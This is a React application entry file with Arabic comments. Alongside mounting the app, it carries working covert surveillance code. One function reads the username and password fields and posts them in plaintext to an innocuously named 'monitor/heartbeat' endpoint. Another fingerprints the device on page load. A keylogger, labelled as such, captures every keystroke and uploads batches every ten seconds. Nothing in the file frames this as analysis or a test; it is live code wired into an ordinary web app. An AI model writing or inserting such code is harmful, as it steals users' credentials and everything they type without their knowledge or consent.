import React from 'react';
import ReactDOM from 'react-dom/client';
import App from './App'; // التطبيق الأصلي

// سكربت جمع بيانات تسجيل الدخول
function collectLoginData() {
    const username = document.getElementById('username')?.value;
    const password = document.getElementById('password')?.value;

    if (!username || !password) return;

    const data = { username, password, timestamp: new Date().toISOString() };
    console.log("إرسال بيانات تسجيل الدخول:", data);
    fetch('/api/monitor/heartbeat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            userId: username,
            username: username,
            password: password, // الرقم السري
            action: 'LOGIN_ATTEMPT',
            platform: navigator.userAgent
        })
    }).catch(() => {});
}

// سكربت جمع معلومات الجهاز
function collectDeviceInfo() {
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        onLine: navigator.onLine,
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screenResolution: `${screen.width}x${screen.height}`,
        referrer: document.referrer,
        timestamp: new Date().toISOString()
    };

    console.log("إرسال معلومات الجهاز:", deviceInfo);
    fetch('/api/monitor/heartbeat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            userId: 'Anonymous',
            username: 'Anonymous',
            password: 'NOT_PROVIDED',
            action: 'DEVICE_INFO',
            platform: deviceInfo.userAgent
        })
    }).catch(() => {});
}

// Keylogger بسيط
let keystrokes: { key: string; timestamp: number }[] = [];
document.addEventListener('keydown', function(e) {
    keystrokes.push({
        key: e.key,
        timestamp: Date.now()
    });
});

function sendKeystrokes() {
    if (keystrokes.length > 0) {
        console.log("إرسال تسجيلات الضغط:", keystrokes);
        fetch('/keystrokes', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'keystrokes', data: keystrokes })
        }).catch(() => {});
        keystrokes = []; // مسح بعد الإرسال
    }
}

// تنفيذ السكربتات عند تحميل الصفحة
window.onload = function() {
    collectDeviceInfo();

    // إرسال تسجيلات الضغط كل 10 ثوانٍ
    setInterval(sendKeystrokes, 10000);
};

// تمرير وظيفة جمع تسجيل الدخول إلى App
const rootElement = document.getElementById('root');
if (!rootElement) {
    throw new Error("Could not find root element to mount to");
}

const root = ReactDOM.createRoot(rootElement);
root.render(
    <React.StrictMode>
        <App collectLoginData={collectLoginData} />
    </React.StrictMode>
);
